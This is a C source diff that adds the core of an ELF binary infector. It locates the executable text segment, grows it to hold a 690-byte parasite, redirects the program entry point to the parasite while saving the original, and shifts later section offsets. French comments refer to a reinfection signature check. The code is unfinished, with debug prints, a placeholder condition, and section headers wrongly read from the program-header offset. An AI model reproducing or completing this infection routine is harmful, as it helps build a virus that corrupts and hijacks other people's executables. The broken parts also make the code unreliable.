@@ -210,8 +210,15 @@ int do_the_job(t_file *file)
 {
 	Elf64_Ehdr          *header;
 	Elf64_Phdr*             seg;
+	Elf64_Shdr*             sec;
 	size_t      parasite_size = 690;
+	Elf64_Addr text;
+	Elf64_Addr parasite_vaddr;
+	Elf64_Addr old_e_entry;
+	Elf64_Addr end_of_text;
+	int text_found = 0;
 	int i;
+	printf("fail: %d\n",file->data[EI_CLASS] != ELFCLASS64);
 	if (file->size < sizeof(Elf64_Ehdr) || ft_strncmp(file->data, ELFMAG,SELFMAG) || file->data[EI_CLASS] != ELFCLASS64)
 		return (1);
 
@@ -226,7 +233,8 @@ int do_the_job(t_file *file)
 				unsigned int pt = (PAGE_SIZE - 4) - parasite_size; // remplacer le 4 par la size de la signature
 
 				//la c est le check de la signature
-				// p_hdr->p_offset + p_hdr->p_filesz + pt
+				// seg->p_offset + seg->p_filesz + pt
+
 				if ("equal" && 0)
 				return 1;
 			}
@@ -239,11 +247,31 @@ int do_the_job(t_file *file)
 		{
 			if (seg->p_flags == (PF_R | PF_X))
 			{
-				//save what i need
+				text = seg->p_vaddr;
+				parasite_vaddr = seg->p_vaddr + seg->p_filesz;
+				old_e_entry = header->e_entry;
+				header->e_entry = parasite_vaddr;
+				end_of_text = seg->p_offset + seg->p_filesz;
+				seg->p_filesz += parasite_size;
+				seg->p_memsz += parasite_size;
+				text_found++;
 			}
 		}
 	}
-	//after change the header of the others add GETPAGE size
+	printf("text_no_found\n");
+
+	if (text_found == 0)
+		return 1;
+	sec = (Elf64_Shdr*)(file->data + header->e_phoff);
+	for (i = header->e_shnum; i-- > 0; sec++)
+	{
+		if (sec->sh_offset >= end_of_text)
+			sec->sh_offset += PAGE_SIZE;
+		else
+		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
+			sec->sh_size += parasite_size;
+	}
+printf("fim do_the_job\n");
 	return 0;
 }
 
